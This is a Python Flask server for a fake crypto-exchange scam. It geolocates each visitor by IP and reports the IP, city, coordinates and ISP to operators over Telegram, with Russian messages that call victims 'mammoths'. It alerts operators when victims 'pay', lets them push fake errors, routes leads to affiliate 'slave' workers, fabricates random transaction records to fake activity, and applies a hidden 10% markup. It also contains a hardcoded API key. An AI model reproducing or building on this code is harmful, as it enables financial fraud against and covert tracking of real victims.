import eventlet
import random
from flask import Flask, jsonify, request
from flask_socketio import SocketIO
import db_api
import json
import string
import requests
from flask_cors import CORS
from flask import send_file
import data.config as config
import time

tgbotUrl = f"https://api.telegram.org/bot{config.tgapi}/sendMessage"
adminId = config.superadmin


db_api.create_db()

if len(db_api.get_coins()[1]) > 2:
    pass
else:
    print(
        f"number of coins should exeed two for server to work. \nCurrent number is:{len(db_api.get_coins()[1])} \nAutogenerating coins..."
    )
    db_api.defaultCoinsCreate()
    print("Done!")

if len(db_api.transactions()[0]) == 8:
    pass
else:
    print("wrong or no TX entries detected in DB, regenerating them...")
    db_api.defaultTxCreate()
    print("Done!")


app = Flask(__name__, static_folder="static")
CORS(app, origins=["*"])
socketio = SocketIO(app, cors_allowed_origins="*")


@socketio.on("message")
def handle_message(data):
    print("Received message:", data)
    socketio.send("Echo: " + data)


@app.route("/send-message", methods=["POST"])
def send_message():
    transID = request.json.get("transID")
    socketio.emit(f"redirect_user_{transID}")
    return {"status": "message sent"}


@app.route("/rollchat", methods=["POST"])
def rollChat():
    userId = request.json.get("userId")
    socketio.emit(f"rollchat_{userId}")
    return {"status": "chat rolled"}


# @app.route("/send-error", methods=["POST"])
# def send_error():
#    transID = request.json.get("transID")
#    socketio.emit(f"redirect_user_{transID}")
#    return {"status": "error sent"}


@app.route("/hideChat", methods=["POST"])
def hideChat1488():
    userId = request.json.get("id")
    socketio.emit(f"hideChat_{userId}")
    return {"status": True}


# @app.route('/static/<svgFile>')
# def serve_content(svgFile):
#    return send_file(f'static/{svgFile}', mimetype='image/svg+xml') --- DOGSHIT, DON'T USE


@app.route(
    "/calculator/<sendCurrencyName>/<receiveCurrencyName>/<sendAmount>/<receiveAmount>/<isChangeReceiveAmount>",
    methods=["POST"],
)
def calculate(
    sendCurrencyName,
    receiveCurrencyName,
    sendAmount,
    receiveAmount,
    isChangeReceiveAmount,
):
    params = {
        "api_key": "e22f49a14d79ce53c6648a3be28a307c4cb0a89afe2469f3feadae3ae98c544b"
    }
    if "ERC20" in str(sendCurrencyName):
        sendCurrencyName = "USDT"
    elif "TRC20" in str(sendCurrencyName):
        receiveCurrencyName = "USDT"
    if str(isChangeReceiveAmount) == "True":
        data = requests.get(
            f"https://min-api.cryptocompare.com/data/blockchain/mining/calculator?fsyms={receiveCurrencyName}&tsyms={sendCurrencyName}",
            params=params,
        ).text
        data = json.loads(data)
        price = data["Data"][f"{receiveCurrencyName}"]["Price"][sendCurrencyName]
        totalPrice = float(receiveAmount) * float(price)
    else:
        data = requests.get(
            f"https://min-api.cryptocompare.com/data/blockchain/mining/calculator?fsyms={sendCurrencyName}&tsyms={receiveCurrencyName}",
            params=params,
        ).text
        data = json.loads(data)
        price = data["Data"][f"{sendCurrencyName}"]["Price"][receiveCurrencyName]
        totalPrice = float(sendAmount) * float(price) * float(1.1)
    return jsonify(amount=totalPrice)


@app.route("/coins", methods=["GET"])
def show_index1():
    data = []
    counter = 0
    full, short, image = db_api.get_coins()
    for x in full:
        data.append(
            {"fullName": x, "shortName": short[counter], "imageUrlP": image[counter]}
        )
        counter += 1
    return jsonify(data)


@app.route("/user/<id>", methods=["GET"])
def getUser(id):
    user_ip = request.headers.get("X-Forwarded-For")
    # ua = request.headers.get("User-Agent")
    if user_ip != None:
        data = requests.get(
            f"http://ip-api.com/json/{user_ip}",
        ).text
        data = json.loads(data)
        country = data["country"]
        city = data["city"]
        cords = data["lat"], data["lon"]
        ans = data["as"]
    else:
        city = "undefined"
        cords = "undefined"
        ans = "undefined"
        country = "undefined"

    online = "true"
    telegram_message = f""" 🦣 Мамонт перешел на сайт \n 🌐 IP: <code>{user_ip}</code>\n 
🔭 Страна: <code>{country}</code>
--
🏢 Город: <code>{city}</code>
--
📍 Координаты: <code>{cords}</code>
--
📡 Провайдер: <code>{ans}</code>
--
🔎 ID На сайте: <code>{id}</code>
"""
    inline_keyboard = {
        "inline_keyboard": [
            [{"text": "Ответить в ТП", "callback_data": f"uans_{id}"}],
            # [{"text": "Кинуть в бан на 6 часов", "callback_data": f"cloak_{user_ip}"}],
            # [{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
            # [{"text": "Удалить ТП", "callback_data": f"uans_{id}"}]
        ]
    }
    print(db_api.checkUser(id))
    if str(id).isdigit() and len(str(id)) == 8 and db_api.checkUser(id) != None:
        chatbanned = db_api.checkForBan(id)
        send_telegram_message(telegram_message, inline_keyboard)
        return jsonify(id=int(id), chatbanned=chatbanned)
    else:
        chatbanned = "0"
        id = db_api.getId()
        db_api.registerUser(id, user_ip, online, chatbanned)
        # send_telegram_message(telegram_message, inline_keyboard)
        return jsonify(id=id, chatbanned=chatbanned)


@app.route("/transactions", methods=["GET"])
def transactionsList():
    data = []
    counter = 0
    txHash, block, fromm, to, value = db_api.transactions()
    for x in txHash:
        data.append(
            {
                "txHash": x,
                "block": block[counter],
                "fromm": fromm[counter],
                "to": to[counter],
                "value": value[counter],
            }
        )
        counter += 1
    return jsonify(
        data,
    )


@app.route("/order/<orderId>", methods=["GET"])
def orderupd(orderId):
    usr = db_api.checkOrder(orderId)
    if not usr:
        print("error")
        return jsonify(error="not found")
    else:
        (
            receiveAmount,
            receiveCurrency,
            sendAmount,
            sendCurrency,
            receiver,
            email,
            referalCode,
            status,
            wallet,
        ) = db_api.getOrderInfo(orderId)
        return jsonify(
            receiveAmount=receiveAmount,
            receiveCurrency=receiveCurrency,
            sendAmount=sendAmount,
            sendCurrency=sendCurrency,
            receiver=receiver,
            email=email,
            referalCode=referalCode,
            status=status,
            wallet=wallet,
        )


@app.route("/confirm/<orderId>", methods=["POST"])
def confirm(orderId):
    db_api.changeStatus(orderId)
    (
        receiveAmount,
        receiveCurrency,
        sendAmount,
        sendCurrency,
        receiver,
        email,
        referalCode,
        status,
        wallet,
    ) = db_api.getOrderInfo(orderId)
    telegram_message = f"{orderId}\n💸 Мамонт обозначил заявку как оплаченную\n\n{sendAmount} {sendCurrency} -> {round(float(receiveAmount),6)} {receiveCurrency}\n{email}\n{status}\n Ожидает перевода на: {receiver}"
    inline_keyboard = {
        "inline_keyboard": [
            [{"text": "Подтвердить", "callback_data": f"confirm_{orderId}"}],
            [{"text": "Выдать ошибку", "callback_data": f"custErr_{orderId}"}],
        ]
    }
    if "e" in str(sendAmount).lower():
        sendAmount = float(sendAmount)
        sendAmount = format(sendAmount, "f")
    if "e" in str(receiveAmount).lower():
        receiveAmount = float(receiveAmount)
        receiveAmount = format(receiveAmount, "f")
    if db_api.checkRefIfValid(referalCode) == True:
        send_tg_message_to_slave(telegram_message, referalCode)
        send_telegram_message(telegram_message, inline_keyboard)
        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
    else:
        send_telegram_message(telegram_message, inline_keyboard)
        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
    return jsonify(status=status)


@app.route("/confirm/<orderId>/passed", methods=["POST"])
def passOrder(orderId):
    db_api.changeStatusToReturned(orderId)
    telegram_message = (
        f"<b>Заявка мамонта помечена как успешная для</b> <code>{orderId}</code>"
    )
    inline_keyboard = {}
    send_telegram_message(telegram_message, inline_keyboard)
    return jsonify(status="passed")


@app.route("/confirm/<orderId>/error", methods=["POST"])
def errOrder(orderId):
    db_api.changeStatusToErr(orderId)
    telegram_message = f"<b>Кастомная ошибка для</b> <code>{orderId}</code>"
    inline_keyboard = {}
    send_telegram_message(telegram_message, inline_keyboard)
    return jsonify(status="error")


@app.route("/msgHistory/<id>/removeChat", methods=["POST"])
def hideChat(id):
    db_api.chatBan(id)
    telegram_message = f"Чат спрятан! {id}"
    inline_keyboard = {}
    send_telegram_message(telegram_message, inline_keyboard)
    return jsonify(status="hidden")


@app.route("/msgSave/<text>/<userId>/<timestamp>/<user>", methods=["POST"])
def msgSave(text, userId, timestamp, user):
    # Пример использования функции send_telegram_message
    telegram_message = (
        f"💬 Сообщение в ТП от пользователя <code>{userId}</code>\n\n{text}"
    )
    inline_keyboard = {
        "inline_keyboard": [
            [{"text": "Ответить", "callback_data": f"uans_{userId}"}],
            [{"text": "Очистить чат", "callback_data": f"rmchat_{userId}"}],
            [{"text": "Удалить ТП", "callback_data": f"hideChat_{userId}"}],
        ]
    }
    if len(userId) == 8 and str(userId).isdigit():
        db_api.addMsg(text, userId, timestamp, user)
        send_telegram_message(telegram_message, inline_keyboard)
    else:
        pass
    return jsonify(reponse="success")


@app.route("/msgHistory/<id>", methods=["GET"])
def getUsers(id):
    try:
        messages, timestamp, user = db_api.getMessages(id)
        print(f"msg - {messages}")
        print(f"time - {timestamp}")
        timestamp = sorted(timestamp)
        data = []
        counter = 0
        for x in timestamp:
            data.append(
                {
                    "text": db_api.get_message(x),
                    "timestamp": timestamp[counter],
                    "user": db_api.get_user(x),
                }
            )
            counter += 1
        return jsonify(data)
    except:
        return jsonify(error="not found")


@app.route("/genTrans", methods=["GET"])
def transactionsGeneratiin():
    block = random.randint(100000, 999999)
    coins = [
        "ADA",
        "BCH",
        "BNB",
        "BTC",
        "DASH",
        "DOGE",
        "DOT",
        "ETC",
        "ETH",
        "FTM",
        "LTC",
        "MATIC",
        "SHIB",
        "SOL",
        "TRX",
        "USDT",
        "XMR",
        "XRP",
        "XTZ",
        "ZEC",
        "ZRX",
    ]
    value = f"{round(random.uniform(0.1, 1.3),2)} {random.choice(coins)}"
    txHash = f"{id_generator(10)}..."
    fromm = f"{address_generator(6)}..."
    to = f"{address_generator(6)}..."
    return jsonify(txHash=txHash, block=block, fromAddress=fromm, to=to, value=value)


@app.route(
    "/newOrder/<receiveAmount>/<receiveCurrency>/<sendAmount>/<sendCurrency>/<receiver>/<email>/<referalCode>/<status>",
    methods=["GET"],
)
def newOrder(
    receiveAmount,
    receiveCurrency,
    sendAmount,
    sendCurrency,
    receiver,
    email,
    referalCode,
    status,
):
    orderIdd = random.randint(111111, 999999)
    if "e" in str(sendAmount).lower():
        sendAmount = float(sendAmount)
        sendAmount = format(sendAmount, "f")
    if "e" in str(receiveAmount).lower():
        receiveAmount = float(receiveAmount)
        receiveAmount = format(receiveAmount, "f")

    inline_keyboard = {
        "inline_keyboard": [
            [{"text": "Ответить", "callback_data": f"uans_{id}"}]
            # [{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
            #
        ]
    }
    if db_api.checkRefIfValid(referalCode) == True:
        payload = f"🤑 Мамонт создал заявку\nРефка: <code>{referalCode}</code>\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
        refmsg = f"🤑 Мамонт создал заявку по твоей рефке: <code>{referalCode}</code>\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}</b>\n{email}\nstatus:<b>{status}</b>"
        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
        send_tg_message_to_slave(refmsg, referalCode)
        send_telegram_message(payload, inline_keyboard)
    elif db_api.checkRefIfValid(referalCode) == False:
        payload = f"🤑 Мамонт создал заявку без рефки\n\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}"
        # If referalCode is 'null', send to a single, specific ID
        # id = adminId  # replace with actual ID for null referal code
        # response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id': id}), headers=headers)
        send_telegram_message(payload, inline_keyboard)
    orderId = db_api.addOrder(
        orderIdd,
        receiveAmount,
        receiveCurrency,
        sendAmount,
        sendCurrency,
        receiver,
        email,
        referalCode,
        status,
    )
    # if response.status_code == 200:
    #    print('Message sent successfully.')
    # else:
    #    print('Failed to send message. Error:', response.text)
    return jsonify(orderId=orderIdd)


def send_tg_message_to_slave(message, referalCode):
    headers = {"Content-Type": "application/json"}
    telegram_api_url = tgbotUrl
    usid = db_api.getUserId(referalCode)
    # id2 = adminId
    refpayload = {
        "chat_id": usid,
        "text": message,
        "parse_mode": "html",
    }
    response = requests.post(
        telegram_api_url, data=json.dumps(refpayload), headers=headers
    )
    if response.status_code == 200:
        print("Message sent successfully.")
    else:
        print("Failed to send message. Error:", response.text)


def send_telegram_message(message, inline_keyboard):
    telegram_api_url = tgbotUrl
    chat_ids = [adminId]
    headers = {"Content-Type": "application/json"}
    for chat_id in chat_ids:
        payload = {
            "chat_id": chat_id,
            "text": message,
            "reply_markup": inline_keyboard,
            "parse_mode": "html",
        }
        response = requests.post(
            telegram_api_url, data=json.dumps(payload), headers=headers
        )
        if response.status_code == 200:
            print("Message sent successfully.")
        else:
            print("Failed to send message. Error:", response.text)


def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


def address_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


if __name__ == "__main__":
    socketio.run(app, host="127.0.0.1", port=5000, debug=True)
    # eventlet.wsgi.server(eventlet.listen(("127.0.0.1", 5000)), app)
